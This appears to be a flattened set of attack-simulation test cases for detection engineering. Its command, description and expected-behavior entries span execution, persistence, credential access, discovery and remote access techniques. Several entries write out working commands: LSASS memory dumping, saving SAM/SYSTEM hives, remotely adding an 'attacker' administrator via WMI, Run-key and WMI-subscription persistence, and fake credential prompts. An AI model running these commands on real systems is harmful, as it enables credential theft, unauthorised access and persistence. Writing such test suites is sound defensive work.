rules.title: PowerShell Execution with Known C2 URLs

falsepositives: Legitimate administrative scripts using PowerShell to access external resources (unlikely due to specific C2 URLs)
Penetration testing or red team activities using the same C2 infrastructure

attacks.description: Basic command to create a file using PowerShell, demonstrating execution capability.
attacks.expected_behavior: Creates a file named test.txt in the TEMP directory with the content 'Hello, World!'.

attacks.description: Intermediate command simulating a connection to a C&C server by downloading a string from a URL.
attacks.expected_behavior: Downloads a string from the specified URL, simulating communication with a C&C server.

attacks.description: Advanced command that downloads an encoded command from a URL and executes it, demonstrating a more complex PowerShell usage.
attacks.expected_behavior: Downloads an encoded command from the specified URL and executes it, simulating a sophisticated attack scenario.

attacks.description: Basic command that executes a PowerShell script to write a file
attacks.expected_behavior: Creates a file /tmp/test.txt with the content 'Hello World'

attacks.description: Intermediate command that executes a PowerShell script to download a file from a C&C server
attacks.expected_behavior: Downloads a file from http://example.com and saves it to /tmp/test.txt

attacks.description: Advanced command that executes a PowerShell script to compress a file
attacks.expected_behavior: Compresses the file /tmp/test.txt and saves it to /tmp/test.zip

attacks.description: Configure a proxy using netsh
attacks.expected_behavior: Sets up a proxy server at 127.0.0.1:8080 for winhttp

attacks.description: Make an HTTP request through a proxy using PowerShell
attacks.expected_behavior: Makes a request to example.com through the proxy server at 127.0.0.1:8080

attacks.description: Download a string through a proxy using WebClient
attacks.expected_behavior: Downloads the content of example.com through the proxy server at 127.0.0.1:8080

attacks.description: Basic example using curl to make an HTTP request through a proxy
attacks.expected_behavior: Successfully connects to example.com through the specified proxy and displays the webpage content

attacks.description: Intermediate example using wget with a proxy environment variable
attacks.expected_behavior: Downloads the content from example.com using the specified proxy

attacks.command: sudo apt-get install proxychains -y; proxychains curl http://example.com
attacks.description: Advanced example installing and using proxychains for proxying curl requests
attacks.expected_behavior: Installs proxychains, then uses it to proxy a curl request to example.com, demonstrating a more complex proxy setup

attacks.description: Add a new user to the system, simulating user execution of a command that requires administrative privileges.
attacks.expected_behavior: A new user named 'testuser' will be added to the system with the specified password.

attacks.description: Display the privileges of the current user, demonstrating a basic user-executed command.
attacks.expected_behavior: The command will display the privileges of the current user.

attacks.description: Display a message box using PowerShell, simulating user execution of a command that utilizes .NET assemblies without reflection.
attacks.expected_behavior: A message box with the text 'Hello, World!' will be displayed.

attacks.description: Basic command execution to create a file in /tmp, demonstrating user-level execution capability.
attacks.expected_behavior: Creates a file named test.txt in /tmp with the content 'Test command'.

attacks.description: Intermediate command execution assuming a malicious file exists in the current directory, demonstrating how a user could inadvertently execute malicious code.
attacks.expected_behavior: Executes the file named malicious_file in the current directory, potentially leading to malicious activity.

attacks.description: Advanced command execution that changes permissions of a script to make it executable and then executes it, demonstrating a more complex scenario of user execution.
attacks.expected_behavior: Changes the permissions of malicious_script.sh to make it executable and then executes it, potentially leading to malicious activity.

attacks.description: Enumerate processes with a main window title using PowerShell
attacks.expected_behavior: Lists the titles of application windows

attacks.description: Use tasklist to enumerate running tasks and their window titles
attacks.expected_behavior: Lists detailed information about running tasks, including their window titles

attacks.description: Use PowerShell to invoke a command that lists running tasks with their window titles, demonstrating interaction with application windows
attacks.expected_behavior: Executes a command to list tasks and their window titles, showing interaction with application windows

attacks.description: Search for Firefox windows using xdotool
attacks.expected_behavior: Lists the window IDs of Firefox windows

attacks.description: List all windows using wmctrl
attacks.expected_behavior: Lists all windows, including their IDs and titles

attacks.description: Search for Google Chrome windows using xdotool
attacks.expected_behavior: Lists the window IDs of Google Chrome windows

attacks.description: This command uses PowerShell to compress a file, demonstrating its use for file operations.
attacks.expected_behavior: The command creates a zip archive of a test file in the temp directory.

attacks.description: This command demonstrates the use of PowerShell to execute a process, in this case, Notepad.
attacks.expected_behavior: Notepad opens with a new file.

attacks.description: This command creates a PowerShell script file, then executes it, showing how PowerShell can be used for script execution.
attacks.expected_behavior: The script runs and prints 'Hello World' to the console.

attacks.description: Basic command to get a list of running processes using PowerShell on Linux
attacks.expected_behavior: The command will list the running processes without causing any harm to the system.

attacks.description: Intermediate command to create a file using PowerShell on Linux
attacks.expected_behavior: The command will create a file named test.txt in the /tmp directory with the content 'Hello World'.

attacks.description: Advanced command to compress a file using PowerShell on Linux
attacks.expected_behavior: The command will compress the test.txt file and save it as test.zip in the /tmp directory, overwriting any existing file with the same name.

attacks.description: Establish a remote connection using telnet
attacks.expected_behavior: A telnet session will be started, allowing remote access to the system.

attacks.description: Download and execute a benign remote access tool using PowerShell
attacks.expected_behavior: The AnyDesk remote access tool will be downloaded and executed, allowing remote access to the system.

attacks.description: Encode and execute a remote access tool using certutil.exe and PowerShell
attacks.expected_behavior: The SimpleHelp remote access tool will be encoded, written to a file, and executed, allowing remote access to the system.

attacks.description: Install AnyDesk remote access tool
attacks.expected_behavior: AnyDesk will be installed and ready for use

attacks.description: Install AnyDesk remote access tool using package manager
attacks.expected_behavior: AnyDesk will be installed and ready for use

attacks.description: Execute SimpleHelp remote access tool
attacks.expected_behavior: SimpleHelp will be executed and provide remote access functionality

attacks.description: Basic log deletion with unused variable obfuscation
attacks.expected_behavior: Deletes /tmp/test.log while evading pattern detection via unused $a variable

attacks.description: Intermediate log file modification requiring elevation
attacks.expected_behavior: Overwrites /var/log/example.log with benign content using unused $b variable, requires root privileges

attacks.description: Advanced log archival and deletion with multiple unused variables
attacks.expected_behavior: Archives audit logs to /tmp/audit.zip then deletes originals, uses unused $x/$y variables and error suppression

attacks.description: Modify the registry to store a test C&C URL using reg.exe, requiring admin privileges.
attacks.expected_behavior: The registry is modified with the specified key and value.

attacks.description: Same as the previous command but serves as an example of using the same technique for a different key or value, still requiring admin privileges.
attacks.expected_behavior: The registry is modified with the specified key and value.

attacks.description: Modify the registry using PowerShell, creating the key if it does not exist and then adding the test C&C URL as a string value, requiring admin privileges.
attacks.expected_behavior: The registry key is created if it does not exist, and the specified value is added.

attacks.description: Modify the crontab to periodically fetch a URL, simulating a C&C check-in
attacks.expected_behavior: The command adds a cron job that runs every 5 minutes, attempting to fetch a URL. This simulates a persistence technique without directly modifying a Windows-like registry.

attacks.description: Modify the crontab to run a command at reboot, simulating persistence
attacks.expected_behavior: This command appends a reboot cron job to fetch a URL, demonstrating persistence by executing a command at system startup.

attacks.command:
echo '[Desktop Entry]
Name=Test
Exec=/usr/bin/wget -q -O /dev/null http://example.com
Type=Application' > ~/.config/autostart/test.desktop
attacks.description: Create a desktop entry to run a command at user login, simulating persistence
attacks.expected_behavior: This command creates a desktop entry in the user's autostart directory, which will execute a command (in this case, fetching a URL) when the user logs in, simulating a form of persistence.

attacks.description: Create a new system service using sc.exe
attacks.expected_behavior: A new system service named TestService will be created.

attacks.description: Start the newly created system service using net.exe
attacks.expected_behavior: The TestService service will be started.

attacks.description: Stop the system service using PowerShell
attacks.expected_behavior: The TestService service will be stopped.

attacks.description: Create a new service using systemd
attacks.expected_behavior: The command will start a new service named myservice, allowing an attacker to maintain access.

attacks.description: Modify an existing service to start automatically
attacks.expected_behavior: The command will modify the myservice service to start automatically on boot, allowing an attacker to maintain access.

attacks.description: Create a new service using a cron job
attacks.expected_behavior: The command will create a new cron job that runs the myservice script every minute, allowing an attacker to maintain access. Note: This command has a high safety risk as it modifies the system's crontab.

attacks.description: Basic example of executing a command via cmd.exe, creating a file in the temp directory.
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello World'.

attacks.description: Intermediate example using PowerShell to create and execute a script in the temp directory.
attacks.expected_behavior: Creates a PowerShell script named test.ps1 in the temp directory and executes it, printing 'Hello World' to the console.

attacks.description: Advanced example using certutil to decode a Base64 encoded string into an executable and then execute it.
attacks.expected_behavior: Decodes a Base64 encoded string from a file named test.txt in the temp directory into an executable named test.exe and then executes it. Note: This command requires a Base64 encoded string to be present in the test.txt file beforehand.

attacks.description: Downloads a script from a URL and executes it using bash. This demonstrates using a network utility (curl) to fetch a script and then executing it, which could be a form of proxy execution if the script is malicious.
attacks.expected_behavior: The command downloads a script and executes it with elevated privileges. In a real attack scenario, this could be used to execute malicious code.

attacks.description: Executes the ls command through the Python interpreter, demonstrating how a signed binary (in this case, python3) could be used to proxy the execution of other commands.
attacks.expected_behavior: Lists the files in the current directory, showing how python can be used to execute system commands.

attacks.description: Downloads a script to a temporary location and then executes it. This demonstrates another form of proxy execution where a utility (wget) is used to fetch a script, and then it is executed.
attacks.expected_behavior: Downloads a script to /tmp and then executes it with elevated privileges, showing how wget and bash can be used in a proxy execution scenario.

attacks.description: Execute the whoami command to print the current user, demonstrating basic command execution.
attacks.expected_behavior: Prints the current username.

attacks.description: Use powershell.exe to list all running processes, demonstrating intermediate command execution.
attacks.expected_behavior: Lists all running processes.

attacks.description: Execute an encoded command using powershell.exe to write a file to the temp directory, demonstrating advanced command execution.
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello, World!'.

attacks.description: Basic command to write a test string to a file
attacks.expected_behavior: Creates a file /tmp/test.txt with the content 'Hello World'

attacks.description: Intermediate command to write a test string to a file in a system directory
attacks.expected_behavior: Creates a file /etc/test.txt with the content 'Hello World' if admin privileges are available

attacks.description: Advanced command to remove a file and then write a test string to a new file
attacks.expected_behavior: Removes the file /tmp/test.txt if it exists, and then creates a new file /tmp/test.txt with the content 'Hello World'

attacks.description: Read the contents of the hosts file
attacks.expected_behavior: The command will display the contents of the hosts file in the command prompt.

attacks.description: Collect network configuration data
attacks.expected_behavior: The command will display detailed network configuration data, including IP addresses and subnet masks.

attacks.description: Collect user information
attacks.expected_behavior: The command will display detailed user information, including the username, user ID, and group memberships.

attacks.description: Collect the hostname of the system
attacks.expected_behavior: Output the system's hostname

attacks.description: Gather IP address information
attacks.expected_behavior: Display IP addresses configured on the system

attacks.description: Collect detailed system information
attacks.expected_behavior: Output detailed information about the system, including the kernel version and operating system

attacks.description: Basic WMI remote command execution to run ipconfig on a target system using wmic.exe
attacks.expected_behavior: Executes ipconfig on the remote host (192.168.1.10) via WMI and saves output to a temporary file. Requires network connectivity and valid domain credentials with administrative privileges.

attacks.command: powershell -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c net user attacker Passw0rd! /add && net localgroup administrators attacker /add', -ComputerName '192.168.1.10' -Credential (New-Object System.Management.Automation.PSCredential('DOMAIN\Admin', (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))) -ErrorAction Stop"
attacks.description: Intermediate: Use PowerShell Invoke-WmiMethod to remotely add a user and add to administrators group via WMI
attacks.expected_behavior: Connects to remote system using WMI and attempts to create a new user and promote to local admin group. Fails if credentials are invalid or WMI access is blocked. Uses secure string handling and explicit credentials.

attacks.command: powershell -Command "$cmd = 'cmd.exe /c whoami > %TEMP%\\whoami_out.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); Invoke-WmiMethod -ComputerName '192.168.1.10' -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c powershell -EncodedCommand $encoded" -Credential (Get-Credential) -Impersonation 3"
attacks.description: Advanced: Remote WMI command execution with Base64-encoded PowerShell payload to obfuscate execution
attacks.expected_behavior: Encodes a simple whoami command in Base64 (UTF-16LE) and executes it remotely via WMI. Simulates advanced obfuscation techniques used in real attacks. Triggers PowerShell execution on target. Requires admin rights and valid credentials.

attacks.description: Basic command to list files in the root directory of the target system using WMIExec.
attacks.expected_behavior: Lists files in the root directory of the target system.

attacks.description: Intermediate command to execute the whoami command on the target system to identify the current user.
attacks.expected_behavior: Displays the username of the current user on the target system.

attacks.description: Advanced command to create a file on the target system using WMIExec and bash.
attacks.expected_behavior: Creates a file named testfile in the /tmp directory of the target system with the content 'testing'.

attacks.description: Basic WMI process creation using WMIC.exe
attacks.expected_behavior: Launches Notepad.exe via WMI process creation call

attacks.command: wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="TestFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" & wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="TestConsumer", ExecutablePath="cmd.exe", CommandLineTemplate="echo TestEvent ^> %TEMP%\wmi_test.txt" & wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="TestFilter"', Consumer='CommandLineEventConsumer.Name="TestConsumer"'
attacks.description: Intermediate WMI event subscription for benign command execution
attacks.expected_behavior: Creates WMI event subscription that writes test file to %TEMP% on system performance counter changes

attacks.command: powershell -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /c echo WMI test > $env:TEMP\wmi_advanced.txt'"
attacks.description: Advanced WMI process creation via PowerShell with output redirection
attacks.expected_behavior: Executes cmd.exe via WMI to create test file in TEMP directory

attacks.description: List running processes on the local machine using WMIC, simulating WMI behavior on Linux.
attacks.expected_behavior: Lists processes running on the system.

attacks.description: List services on the local machine using WMIC, demonstrating service interaction similar to WMI.
attacks.expected_behavior: Lists services installed on the system.

attacks.description: Using PowerShell on Linux to find a specific process, simulating a WMI query for process information.
attacks.expected_behavior: Finds and displays information about a process named 'testprocess' if it exists.

attacks.description: Lists all running processes briefly using WMI.
attacks.expected_behavior: Displays a list of running processes with basic information.

attacks.description: Retrieves detailed information about running processes on the local machine using WMI.
attacks.expected_behavior: Displays detailed information about each running process, including name, process ID, and command line.

attacks.description: Uses PowerShell to query WMI for all process objects, demonstrating an alternative method to achieve similar results to `wmic`.
attacks.expected_behavior: Lists all running processes using the `Get-WmiObject` Cmdlet in PowerShell.

attacks.description: Query remote Windows host OS information via WMI
attacks.expected_behavior: Attempts to retrieve OS information from the specified Windows host using WMI; fails safely with -ErrorAction if target is unreachable.

attacks.description: Create a process on a remote Windows host via WMI
attacks.expected_behavior: Attempts to launch calc.exe on the remote host via WMI process creation; fails gracefully due to test IP/permissions.

attacks.command: powershell -Command "$f=Set-WmiInstance -Namespace 'root\subscription' -Class __EventFilter -Arguments @{Name='TestFilter';Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'\"}; $c=Set-WmiInstance -Namespace 'root\subscription' -Class CommandLineEventConsumer -Arguments @{Name='TestConsumer';CommandLineTemplate='cmd.exe /c echo Test > %TEMP%\log.txt'}; Set-WmiInstance -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} -ErrorAction SilentlyContinue"
attacks.description: Create WMI event subscription for persistence (advanced)
attacks.expected_behavior: Creates WMI event filter/consumer/binding to log test message on process creation; uses %TEMP% for safe file writing and cleans up errors.

attacks.command: reg save HKLM\SAM "%TEMP%\sam.save" && reg save HKLM\SYSTEM "%TEMP%\system.save"
attacks.description: Saves SAM and SYSTEM registry hives to TEMP directory using reg.exe
attacks.expected_behavior: SAM and SYSTEM hives are saved to the user's TEMP directory for offline credential extraction.

attacks.command: powershell -Command "$p=Get-Process lsass; rundll32 C:\windows\System32\comsvcs.dll MiniDump $p.Id $env:TEMP\lsass.dmp full"
attacks.description: Dumps LSASS process memory using PowerShell and rundll32
attacks.expected_behavior: Creates a full memory dump of the LSASS process in TEMP directory, which can be analyzed for credentials.

attacks.description: Uses Volume Shadow Copy to extract SAM and SYSTEM files without locking the live registry
attacks.expected_behavior: Creates a shadow copy of C: drive and copies SAM/SYSTEM files from the shadow volume to TEMP for credential dumping.

attacks.description: Search for password entries in /etc/passwd
attacks.expected_behavior: Display lines from /etc/passwd containing 'password'

attacks.description: Attempt to read a private SSH key
attacks.expected_behavior: Display the contents of the private SSH key if readable

attacks.description: Search command history for 'password'
attacks.expected_behavior: Display history entries containing 'password'

attacks.description: List active network connections and listening ports
attacks.expected_behavior: Displays all active TCP/UDP connections with associated process IDs, showing open ports and network activity.

attacks.description: Enumerate active TCP connections using PowerShell
attacks.expected_behavior: Outputs active TCP connections including local IP addresses, ports, and connection states (e.g., Listen, Established).

attacks.command: sc queryex type= service state= all | findstr /i "dhcp dns http"
attacks.description: Identify network-related services via service control manager
attacks.expected_behavior: Lists services with names containing common network protocol keywords (DHCP/DNS/HTTP), revealing network service configurations.

attacks.description: Basic network service discovery using TCP connect scan
attacks.expected_behavior: Discover network services on the local system

attacks.description: Intermediate network service discovery using UDP scan
attacks.expected_behavior: Discover network services on the local system using UDP

attacks.description: Advanced network service discovery using TCP connect scan on all ports
attacks.expected_behavior: Discover all network services on the local system

attacks.description: Basic archiving of a test file using makecab
attacks.expected_behavior: Creates a cabinet archive of a test file in the temp directory

attacks.description: Intermediate archiving using PowerShell's Compress-Archive cmdlet
attacks.expected_behavior: Creates a zip archive of a test file in the temp directory, overwriting if necessary

attacks.description: Advanced scenario encoding a file with certutil before archiving with makecab
attacks.expected_behavior: Encodes a test file using certutil and then archives the encoded file using makecab

attacks.description: Basic command to archive a single file using tar with gzip compression.
attacks.expected_behavior: Creates a gzip-compressed archive of the specified file.

attacks.description: Intermediate command to archive a directory using tar with bzip2 compression.
attacks.expected_behavior: Creates a bzip2-compressed archive of the specified directory and its contents.

attacks.description: Advanced command to archive multiple files using zip.
attacks.expected_behavior: Creates a zip archive containing the specified files.

attacks.description: Create a daily scheduled task that runs a command to write 'Hello' to a file in the temp directory
attacks.expected_behavior: A new scheduled task named 'Test Task' is created and runs daily, writing 'Hello' to %TEMP%\test.txt

attacks.description: Create a daily scheduled task using PowerShell that runs a command to write 'Hello' to a file in the temp directory
attacks.expected_behavior: A new scheduled task named 'Test Task PowerShell' is created and runs daily, writing 'Hello' to $env:TEMP\test_ps.txt

attacks.description: Delete the scheduled task 'Test Task' forcefully
attacks.expected_behavior: The scheduled task 'Test Task' is deleted

attacks.description: Lists all scheduled tasks for the current user and saves them to a file in /tmp.
attacks.expected_behavior: This command lists and saves the current user's scheduled tasks to a file without modifying the system, demonstrating basic interaction with scheduled tasks.

attacks.description: Schedules a daily task to create a file in /tmp, demonstrating how an attacker might achieve persistence.
attacks.expected_behavior: This command adds a new scheduled task that runs daily, creating a file in /tmp. It demonstrates intermediate persistence techniques without causing harm.

attacks.description: Appends a new daily task to the existing scheduled tasks, creating a file in /tmp, and demonstrates a more advanced technique of modifying existing schedules.
attacks.expected_behavior: This command shows how to append a new task to the existing crontab, demonstrating an advanced persistence technique by modifying the schedule without overwriting existing tasks.

attacks.command: powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; Add-Type -AssemblyName System.Windows.Forms; [Microsoft.VisualBasic.Interaction]::InputBox('Test Input Capture', 'Enter your credentials')"
attacks.description: Simulates input capture by prompting the user for input using PowerShell.
attacks.expected_behavior: Displays a dialog box asking the user to enter their credentials.

attacks.command: powershell -Command "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $form = New-Object System.Windows.Forms.Form; $form.Text = 'Input Capture Test'; $label = New-Object System.Windows.Forms.Label; $label.Text = 'Enter your credentials:'; $label.AutoSize = $true; $form.Controls.Add($label); $textbox = New-Object System.Windows.Forms.TextBox; $form.Controls.Add($textbox); $form.ShowDialog()"
attacks.description: Creates a simple form to capture user input using PowerShell and Windows Forms.
attacks.expected_behavior: Displays a form with a label and a text box, capturing the user's input when the form is closed.

attacks.command: cmd.exe /c "echo Please enter your credentials: & set /p credentials="
attacks.description: Uses the command prompt to capture user input by prompting for credentials.
attacks.expected_behavior: Prompts the user to enter their credentials, storing the input in the 'credentials' variable.

attacks.description: Capture network traffic using tcpdump and record user input using script
attacks.expected_behavior: The command will capture network traffic and record user input, potentially capturing sensitive information

attacks.description: Capture user input using xinput and log it to a file
attacks.expected_behavior: The command will capture user input and log it to a file, potentially capturing sensitive information

attacks.description: Capture system calls using strace and log them to a file
attacks.expected_behavior: The command will capture system calls and log them to a file, potentially capturing sensitive information

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestRunKey" /t REG_SZ /d "cmd.exe /c echo Hello from Run Key" /f
attacks.description: Adds a simple Run Key for the current user using reg.exe
attacks.expected_behavior: Registry entry is added under HKCU Run key; command runs at user login and prints 'Hello from Run Key' to console

attacks.command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /t REG_SZ /d "cmd.exe /c echo Running as system at startup" /f
attacks.description: Adds a Run Key at the system level using reg.exe, requires admin
attacks.expected_behavior: Registry entry is added under HKLM Run key; command runs at system startup for all users and prints message to console

attacks.command: powershell -Command "mkdir '%TEMP%\_startup' -ErrorAction SilentlyContinue; $payload = 'notepad.exe'; $path = '%TEMP%\_startup\stub.bat'; $payload | Out-File -FilePath $path -Encoding ASCII -Force; reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v 'StealthStub' /t REG_SZ /d '""$path""' /f"
attacks.description: Creates a batch file in %TEMP%, then adds a Run Key pointing to it using PowerShell for setup
attacks.expected_behavior: A batch file is created in %TEMP%\_startup, and a registry Run Key is set to execute it at user login; notepad.exe is launched silently

attacks.description: Appends a simulated malicious command to the user's bashrc file for persistence upon each login.
attacks.expected_behavior: Upon the next login, the command 'echo "Simulated Malicious Command"' will be executed, simulating the execution of a malicious command added for persistence.

attacks.description: Modifies the user's crontab to include a command that will be executed on system reboot, simulating persistence.
attacks.expected_behavior: On the next system reboot, the command 'echo "Simulated Malicious Command"' will be executed, demonstrating persistence through crontab modification.

attacks.description: Adds a simulated malicious command to the system-wide rc.local script for execution on system startup, requiring admin privileges.
attacks.expected_behavior: On the next system reboot, the command 'echo Simulated Malicious Command' will be executed, showing persistence through modification of system startup scripts.

attacks.description: Initiate a Remote Desktop connection to a target IP address using mstsc.exe
attacks.expected_behavior: Opens the Remote Desktop Connection client with the specified IP address pre-filled. No connection is made unless user confirms. No payload or data exfiltration occurs.

attacks.description: Create a temporary RDP connection file with a specified target and launch it
attacks.expected_behavior: Creates an RDP file in the user's temp directory and launches mstsc to open it. The RDP client opens with the target host pre-configured. File is not cleaned up automatically but poses no risk.

attacks.description: Use PowerShell to execute mstsc.exe with a target IP, simulating obfuscated command execution
attacks.expected_behavior: PowerShell invokes mstsc.exe to connect to the specified IP address. This method is often used in attacks to bypass simple command-line logging. No actual connection is made without user interaction.

attacks.description: Simulate an RDP connection to a Windows machine using rdesktop, a Linux RDP client.
attacks.expected_behavior: Establishes a test RDP connection to the specified IP address.

attacks.description: Simulate an RDP connection using xfreerdp, another Linux RDP client, for variation.
attacks.expected_behavior: Establishes a test RDP connection to the specified IP address with different client software.

attacks.description: Use Remmina, a Linux remote desktop client, to connect to a pre-configured RDP connection.
attacks.expected_behavior: Loads a pre-configured RDP connection profile named 'testconfig' in Remmina.
